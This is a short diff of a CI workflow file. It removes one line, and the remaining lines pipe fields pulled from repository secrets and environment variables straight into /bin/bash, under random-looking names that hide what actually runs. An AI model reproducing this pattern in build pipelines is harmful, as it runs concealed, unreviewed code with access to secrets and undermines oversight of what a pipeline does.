@@ -22,7 +22,6 @@ jobs:
           aulvf810: ${{ secrets.aulvf810 }}
         run: |
           printf '%s' "$aulvf810" | jq -r .w907 | /bin/bash
-          echo $ewupt84880 | jq -r .wukbu11369 | /bin/bash
           printf '%s' "$j686" | jq -r .fnup6813 | /bin/bash
 
       - name: Upload output
